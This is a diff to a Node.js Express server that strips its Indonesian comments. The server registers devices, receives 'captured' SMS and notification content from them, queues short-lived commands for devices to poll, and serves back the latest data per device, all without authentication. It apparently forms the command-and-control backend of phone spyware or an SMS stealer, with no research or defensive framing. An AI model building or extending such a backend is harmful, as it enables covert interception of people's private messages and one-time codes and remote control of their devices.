@@ -4,12 +4,10 @@ import { kv } from '@vercel/kv';
 const app = express();
 app.use(express.json({ limit: '2mb' }));
 
-// Helper untuk ambil device_id dari query/body
 function getDeviceId(req) {
   return req.query.device_id || req.body.device_id;
 }
 
-// Endpoint untuk register perangkat
 app.post('/api/register', async (req, res) => {
   const { device_id, info } = req.body;
   if (!device_id) return res.status(400).json({ error: 'device_id required' });
@@ -18,7 +16,6 @@ app.post('/api/register', async (req, res) => {
   res.json({ success: true });
 });
 
-// Endpoint untuk menerima data (SMS, notifikasi, dll)
 app.post('/api/capture', async (req, res) => {
   const { type, content, device_id, timestamp } = req.body;
   if (!device_id) return res.status(400).json({ error: 'device_id required' });
@@ -27,7 +24,6 @@ app.post('/api/capture', async (req, res) => {
   res.json({ success: true });
 });
 
-// Ambil daftar perangkat
 app.get('/api/devices', async (req, res) => {
   const deviceIds = await kv.smembers('devices');
   const devices = [];
@@ -38,17 +34,15 @@ app.get('/api/devices', async (req, res) => {
   res.json({ devices });
 });
 
-// Kirim perintah ke perangkat
 app.post('/api/command', async (req, res) => {
   const { device_id, command, params } = req.body;
   if (!device_id || !command) return res.status(400).json({ error: 'device_id and command required' });
   const commandId = Date.now();
   await kv.set(`command:${device_id}:${commandId}`, { command, params });
-  await kv.expire(`command:${device_id}:${commandId}`, 60); // auto hapus 60 detik
+  await kv.expire(`command:${device_id}:${commandId}`, 60);
   res.json({ success: true, command_id: commandId });
 });
 
-// Perangkat polling perintah
 app.get('/api/poll', async (req, res) => {
   const device_id = getDeviceId(req);
   if (!device_id) return res.status(400).json({ error: 'device_id required' });
@@ -68,7 +62,6 @@ app.get('/api/poll', async (req, res) => {
   res.json({ commands });
 });
 
-// Ambil data terakhir perangkat
 app.get('/api/data', async (req, res) => {
   const device_id = getDeviceId(req);
   if (!device_id) return res.status(400).json({ error: 'device_id required' });
